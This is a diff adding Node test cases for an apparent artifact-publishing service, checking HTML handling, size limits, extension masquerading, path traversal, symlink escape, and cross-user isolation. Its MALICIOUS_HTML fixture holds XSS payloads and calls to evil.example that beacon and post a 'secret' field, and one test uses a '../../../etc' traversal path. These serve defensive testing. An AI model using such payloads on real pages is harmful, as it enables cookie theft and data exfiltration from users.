@@ -577,3 +577,218 @@ test("overlapping conversation turns are serialized before active-turn markers a
   assert.equal(recordA.turnId, "serialized-turn-a");
   assert.equal(recordB.turnId, "serialized-turn-b");
 });
+
+const VALID_HTML = `<!DOCTYPE html>
+<html lang="zh"><head><meta charset="utf-8"><title>复盘</title><style>body{color:#111}</style></head>
+<body><h1>2026-07-24 日复盘</h1><p>持仓稳定，无新增风险信号。</p></body></html>`;
+
+const MALICIOUS_HTML = `<!DOCTYPE html>
+<html><head><meta charset="utf-8"><script>alert(document.cookie)</script><link rel="stylesheet" href="https://evil.example/x.css"></head>
+<body onload="fetch('https://evil.example/beacon')"><img src="https://evil.example/x.png" onerror="alert(1)">
+<form action="https://evil.example/collect" method="post"><input name="secret"></form>
+<a href="https://evil.example">external link</a></body></html>`;
+
+test("publishes and reads a safe HTML document with html preview mode and stable checksum", async () => {
+  const { workspaceUserA, mod } = await getCtx();
+  const target = path.join(workspaceUserA, "reports", "daily", "2026-07-24.html");
+  await writeFile(target, VALID_HTML);
+  const record = await mod.publishConversationArtifact({
+    userId: "user-a",
+    instanceId: "user-a",
+    relativePath: "reports/daily/2026-07-24.html",
+    scope: { projectId: "invest-agent", assistantId: "user-a", conversationId: "conv-html" },
+  });
+  assert.equal(record.mimeType, "text/html");
+  assert.equal(record.previewMode, "html");
+  assert.equal(record.kind, "report");
+  assert.equal(record.checksum && record.checksum.length, 64);
+  const read = await mod.readConversationArtifactPayload({
+    artifactId: record.artifactId,
+    userId: "user-a",
+    instanceId: "user-a",
+  });
+  assert.equal(read.payload.mimeType, "text/html");
+  assert.equal(read.descriptor.previewMode, "html");
+  assert.equal(Buffer.from(read.payload.base64, "base64").toString("utf8"), VALID_HTML);
+  assert.equal(read.payload.checksum, record.checksum);
+  const { createHash } = await import("node:crypto");
+  assert.equal(record.checksum, createHash("sha256").update(Buffer.from(VALID_HTML, "utf8")).digest("hex"));
+});
+
+test("maps .htm files to text/html with html preview mode", async () => {
+  const { workspaceUserA, mod } = await getCtx();
+  const target = path.join(workspaceUserA, "reports", "daily", "brief.htm");
+  await writeFile(target, VALID_HTML);
+  const record = await mod.publishConversationArtifact({
+    userId: "user-a",
+    instanceId: "user-a",
+    relativePath: "reports/daily/brief.htm",
+    scope: { projectId: "invest-agent", assistantId: "user-a" },
+  });
+  assert.equal(record.mimeType, "text/html");
+  assert.equal(record.previewMode, "html");
+});
+
+test("rejects HTML documents larger than the 1MB html cap", async () => {
+  const { workspaceUserA, mod } = await getCtx();
+  const target = path.join(workspaceUserA, "reports", "daily", "huge.html");
+  // Just over the 1MB html cap but far below the generic 15MB cap, so this
+  // only passes if the tighter html limit is enforced.
+  const huge = `<div>${"x".repeat(1024 * 1024)}</div>`;
+  await writeFile(target, huge);
+  await assert.rejects(
+    () => mod.publishConversationArtifact({
+      userId: "user-a",
+      instanceId: "user-a",
+      relativePath: "reports/daily/huge.html",
+      scope: { projectId: "invest-agent", assistantId: "user-a" },
+    }),
+    (error: unknown) => expectErrorCode(error, "ARTIFACT_TOO_LARGE"),
+  );
+});
+
+test("rejects extension masquerading: html extension with PNG body", async () => {
+  const { workspaceUserA, mod } = await getCtx();
+  const target = path.join(workspaceUserA, "reports", "daily", "fake.html");
+  const pngBytes = Buffer.from([
+    0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a,
+    0x00, 0x00, 0x00, 0x0d, 0x49, 0x48, 0x44, 0x52,
+  ]);
+  await writeFile(target, pngBytes);
+  await assert.rejects(
+    () => mod.publishConversationArtifact({
+      userId: "user-a",
+      instanceId: "user-a",
+      relativePath: "reports/daily/fake.html",
+      scope: { projectId: "invest-agent", assistantId: "user-a" },
+    }),
+    (error: unknown) => expectErrorCode(error, "ARTIFACT_UNSAFE"),
+  );
+});
+
+test("rejects path traversal for html artifacts", async () => {
+  const { mod } = await getCtx();
+  await assert.rejects(
+    () => mod.publishConversationArtifact({
+      userId: "user-a",
+      instanceId: "user-a",
+      relativePath: "reports/daily/../../../etc/evil.html",
+      scope: { projectId: "invest-agent", assistantId: "user-a" },
+    }),
+    (error: unknown) => expectErrorCode(error, "ARTIFACT_INVALID_PATH"),
+  );
+});
+
+test("rejects html symlinks that escape the reports directory", async () => {
+  const { root, workspaceUserA, mod } = await getCtx();
+  const outsideHtml = path.join(root, "outside.html");
+  await writeFile(outsideHtml, VALID_HTML);
+  const symlinkTarget = path.join(workspaceUserA, "reports", "daily", "escape.html");
+  await symlink(outsideHtml, symlinkTarget);
+  await assert.rejects(
+    () => mod.publishConversationArtifact({
+      userId: "user-a",
+      instanceId: "user-a",
+      relativePath: "reports/daily/escape.html",
+      scope: { projectId: "invest-agent", assistantId: "user-a" },
+    }),
+    (error: unknown) =>
+      expectErrorCode(error, "ARTIFACT_INVALID_PATH") || expectErrorCode(error, "ARTIFACT_NOT_FOUND"),
+  );
+});
+
+test("rejects cross-user reads of html artifacts", async () => {
+  const { workspaceUserA, mod } = await getCtx();
+  const target = path.join(workspaceUserA, "reports", "daily", "private.html");
+  await writeFile(target, VALID_HTML);
+  const record = await mod.publishConversationArtifact({
+    userId: "user-a",
+    instanceId: "user-a",
+    relativePath: "reports/daily/private.html",
+    scope: { projectId: "invest-agent", assistantId: "user-a" },
+  });
+  await assert.rejects(
+    () => mod.readConversationArtifactPayload({ artifactId: record.artifactId, userId: "user-b", instanceId: "user-b" }),
+    (error: unknown) => expectErrorCode(error, "ARTIFACT_SCOPE_MISMATCH"),
+  );
+});
+
+test("malicious HTML is only ever served as artifact bytes, never via the legacy report asset route", async () => {
+  const { workspaceUserA, mod } = await getCtx();
+  const target = path.join(workspaceUserA, "reports", "daily", "evil.html");
+  await writeFile(target, MALICIOUS_HTML);
+  // The runtime does not execute or rewrite HTML: the payload is stored and
+  // returned verbatim as opaque artifact bytes. The Portal safety boundary
+  // is the sandboxed iframe + CSP, which is out of scope for this service.
+  const record = await mod.publishConversationArtifact({
+    userId: "user-a",
+    instanceId: "user-a",
+    relativePath: "reports/daily/evil.html",
+    scope: { projectId: "invest-agent", assistantId: "user-a" },
+  });
+  assert.equal(record.previewMode, "html");
+  const read = await mod.readConversationArtifactPayload({
+    artifactId: record.artifactId,
+    userId: "user-a",
+    instanceId: "user-a",
+  });
+  assert.equal(read.payload.mimeType, "text/html");
+  assert.equal(Buffer.from(read.payload.base64, "base64").toString("utf8"), MALICIOUS_HTML);
+  assert.equal(read.payload.checksum, record.checksum);
+
+  // The legacy same-origin report asset route must refuse to inline-serve
+  // html content; html documents only travel through the artifact bytes
+  // channel above.
+  const assets = await import("../src/services/workspace-report-assets.js");
+  for (const relativePath of ["reports/daily/evil.html", "reports/daily/brief.htm"]) {
+    await assert.rejects(
+      () => assets.readWorkspaceReportAsset({ userId: "user-a", relativePath }),
+      (error: unknown) =>
+        error instanceof Error &&
+        error.name === "WorkspaceReportAssetError" &&
+        (error as InstanceType<typeof assets.WorkspaceReportAssetError>).code === "REPORT_ASSET_UNSUPPORTED",
+    );
+  }
+});
+
+test("SVG artifact published inside a turn binds to the assistant message artifacts", async () => {
+  const { workspaceUserA, mod } = await getCtx();
+  const userId = "user-a";
+  const instanceId = "user-a";
+  const conversationId = "conv-svg-bind";
+  const turnId = "svg-turn-1";
+  const target = path.join(workspaceUserA, "reports", "metrics", "bind-flow.svg");
+  await writeFile(target, VALID_SVG);
+
+  const { markTurnStart, markTurnEnd } = await import("../src/services/conversation-turns.js");
+  markTurnStart({ userId, instanceId, conversationId, turnId });
+  const record = await mod.publishConversationArtifact({
+    userId,
+    instanceId,
+    relativePath: "reports/metrics/bind-flow.svg",
+    scope: { projectId: "invest-agent", assistantId: userId, conversationId },
+  });
+  markTurnEnd({ userId, instanceId, conversationId, turnId });
+  assert.equal(record.turnId, turnId);
+  assert.equal(record.previewMode, "image");
+
+  // Mirror what conversation-log does when the assistant reply lands: the
+  // artifact is stamped with the assistant message id and then surfaced as
+  // the message's metadata.artifacts descriptors.
+  const assistantMessageId = "msg-assistant-svg";
+  const bindResult = mod.bindArtifactsToAssistantMessageForTest({
+    userId,
+    instanceId,
+    conversationId,
+    assistantMessageId,
+    turnId,
+  });
+  assert.equal(bindResult.attached, 1);
+
+  const messageArtifacts = mod.findArtifactsForMessage({ userId, instanceId, conversationId, messageId: assistantMessageId });
+  assert.equal(messageArtifacts.length, 1);
+  assert.equal(messageArtifacts[0].artifactId, record.artifactId);
+  assert.equal(messageArtifacts[0].mimeType, "image/svg+xml");
+  assert.equal(messageArtifacts[0].previewMode, "image");
+  assert.equal(messageArtifacts[0].checksum, record.checksum);
+});
